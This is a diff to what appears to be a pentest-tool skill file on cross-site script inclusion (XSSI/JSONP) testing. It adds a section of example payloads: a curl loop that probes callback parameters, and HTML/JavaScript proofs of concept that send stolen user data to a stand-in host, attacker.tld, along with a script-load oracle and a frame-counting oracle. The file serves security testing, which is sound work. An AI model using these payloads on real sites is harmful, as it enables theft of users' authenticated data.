@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-942]
-chains_with: []
-prerequisites: []
+chains_with: [wstg-clnt-07, wstg-clnt-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -377,6 +377,73 @@ jsonpParams.forEach((param) => {
 
 ---
 
+## Example Commands/Payloads
+
+### JSONP callback discovery
+
+```bash
+TARGET="https://{target}"
+for cb in callback jsonp cb jsonpcallback func; do
+  curl -s "$TARGET/api/user?$cb=xssiTest" | grep -q "xssiTest(" && echo "[VULN] param=$cb"
+done
+```
+
+### JSONP data-theft PoC (host on attacker.tld)
+
+```html
+<script>
+  function callback(data) {
+    new Image().src = "https://attacker.tld/log?data=" + encodeURIComponent(JSON.stringify(data))
+  }
+</script>
+<script src="https://{target}/api/user?callback=callback"></script>
+```
+
+### Legacy JSON array hijacking PoC
+
+```html
+<script>
+  Array.prototype.__defineSetter__("0", function (val) {
+    fetch("https://attacker.tld/log?data=" + encodeURIComponent(val))
+  })
+</script>
+<script src="https://{target}/api/users"></script>
+```
+
+### Authenticated-JS variable theft
+
+```html
+<script src="https://{target}/js/config.js"></script>
+<script>
+  if (typeof userData !== "undefined") {
+    fetch("https://attacker.tld/log", { method: "POST", body: JSON.stringify(userData) })
+  }
+</script>
+```
+
+### Event Handler Leak (Script) — detect valid-vs-invalid script inclusion without reading the body
+
+Even when a JSONP/callback isn't controllable, `onload` firing vs `onerror` firing on a `<script src>` tag reveals whether the endpoint returned syntactically valid JavaScript for the *current* auth state — a binary leak usable to probe conditions server-side (e.g. "does this authenticated user have role X", if the endpoint only returns valid JS for that role):
+
+```html
+<script src="https://{target}/api/user.js"
+        onload="fetch('https://attacker.tld/log?valid=1')"
+        onerror="fetch('https://attacker.tld/log?valid=0')"></script>
+```
+
+### Frame counting as a script-inclusion oracle
+
+If the authenticated response embeds a different number of nested resources/scripts depending on state (e.g. admin vs normal user script bundle), counting frames/subresources after including the page as a script/object leaks that state:
+
+```javascript
+var win = window.open("https://{target}/dashboard")
+setTimeout(() => {
+  console.log("%d frames detected", win.length)
+}, 2000)
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -469,6 +536,7 @@ async function fetchSecure(url) {
 - [OWASP Testing Guide - XSSI](https://owasp.org/www-project-web-security-testing-guide/)
 - [Google - JSON Hijacking](https://security.googleblog.com/)
 - [Sebastian Lekies - XSSI Research](https://www.mbsd.jp/Whitepaper/xssi.pdf)
+- [PayloadsAllTheThings - XS-Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XS-Leak)
 
 
 ---
